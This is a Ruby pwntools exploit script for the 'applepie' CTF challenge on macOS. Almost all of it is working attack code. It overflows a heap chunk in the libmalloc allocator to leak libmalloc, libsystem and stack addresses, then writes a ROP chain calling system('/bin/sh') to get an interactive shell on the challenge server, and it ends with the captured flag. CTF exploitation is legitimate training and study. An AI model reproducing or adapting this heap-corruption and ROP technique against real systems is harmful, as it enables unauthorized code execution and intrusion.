#!/usr/bin/env ruby
# encoding: ascii-8bit
require 'pry'
require 'pwn'        # https://github.com/peter50216/pwntools-ruby
require 'one_gadget' # https://github.com/david942j/one_gadget

# @magic = one_gadget(file: './libc.so.6')[0]

host, port = '111.186.63.147', 6666
@local = false
if ARGV.empty?
  host = '127.0.0.1'; @local = true
else
  raise ArgumentError, 'host not set' if host.empty?
end
# $z = Sock.new host, port
$z = @local ? Tubes::Process.new('sandbox-exec -f ./test.sb /Users/david942j/applepie 2>/dev/null') : Sock.new(host, port)
def z;$z;end
@p = ''
def h;@h ||= heapinfo(@p);end
def elf; @elf ||= ELF.new(@p); end
def debug!; context.log_level = :debug; end
#================= Exploit Start ====================
context.arch = :amd64
# debug!
def pt(s = nil); z.gets ':'; z.puts s if s; end
@obj = Array.new(10) { true }
def add(style, shape, size, name)
  pt(1)
  pt(style)
  pt(shape)
  pt(size)
  pt
  z.write name
  @obj.find_index(&:itself).tap { |i| @obj[i] = false }
end

def show(idx)
  pt(2)
  pt(idx)
end


def update(idx,style,shape,size,name)
  pt(3)
  pt(idx)
  pt(style)
  pt(shape)
  pt(size)
  pt
  # STDIN.gets if name[0]=='Q'
  z.write name
end

def free(idx)
  pt(4)
  pt(idx)
  @obj[idx] = true
end

def libmalloc
  return 0x7fff661a2000 unless @local
  return @libmalloc if defined? @libmalloc
  update(@a, 2, 3, 0x50, 'A' * 0x40 + p64(0x3fc0 / 8) + "\n" )
  show(@b)
  z.gets 'Style: '
  @libmalloc = (z.readn(6).ljust(8, "\x00").u64 - 0xd68).tap { z.gets 'Choice' }
end

def libdata
  return 0x7fff98db9000 unless @local
  return @libdata if defined? @libdata
  update(@a, 2, 3, 0x50, 'A' * 0x40 + p64(-17) + "\n")
  show(@b)
  z.gets 'Style: '
  @libdata = (z.readn(6).ljust(8, "\x00").u64 - 0x4110).tap { z.gets 'Choice' }
end

def easy_leak
  @a = add(1,2,0x40,"da\n")
  @b = add(1,2,0x40,"da\n")
  log.dump libmalloc.hex
  log.dump libdata.hex
end

easy_leak

a = add(1, 2, 0x30, 'A' * 0x30)
b = add(1, 2, 0x30, 'B' * 0x30)
c = add(3, 3, 0x30, 'C' * 0x30)
d = add(4, 4, 0x30, 'D' * 0x30)
free(b)
free(c)
update(a, 1, 1, 0x48, 'A' * 0x30 + flat(0x7 << 60, 0x7 << 60, 0x10))
# STDIN.gets
free(a)
e = add(1, 1, 0x130, 'E' * 0xf0 + flat(0, 0, 0, 0x40, libdata + 0x8c38) + "\n")
show(d)
z.gets 'Name: '
stack = (z.readn(6) + "\x00\x00").u64
log.dump stack.hex

update(e, 1, 1, 0x130, 'E' * 0xf0 + flat(0, 0, 0, 0x40, libdata + 0x16080) + "\n")
show(d)
z.gets 'Name: '
libsystem = (z.readn(6) + "\x00\x00").u64 - 0x10014
log.dump libsystem.hex
log.dump libsystem - libmalloc == -0x174000

# 32.times do |i|
#   update(e, 1, 1, 0x130, 'Q' * 0xf0 + flat(0, 0, 0, 0x100, stack - i * 8) + "\n")
#   show(d)
#   z.gets 'Name: '
#   p [(-i * 8).hex, z.gets]
#   z.gets 'Choice'
# end

update(e, 1, 1, 0x130, 'Q' * 0xf0 + flat(0, 0, 0, 0x100, stack - (@local ? 0xa0 : 0x98)) + "\n")
pop_rdi = libmalloc + 0x8f52
ret = pop_rdi + 1
system = libsystem + 0x7b926
system2 = libsystem + 0x638ed
sh = libsystem + 0x85256
log.dump [ret.hex, pop_rdi.hex, sh.hex, system2.hex]
rop = flat(
  ret, # let rsp have 0x10 align
  pop_rdi,
  sh,
  system2
)
fail if rop.include?("\n")
update(d, 1, 1, rop.size, rop)

z.interact

# flag{Are_you_hungry?Ahaaaaaaaa!}
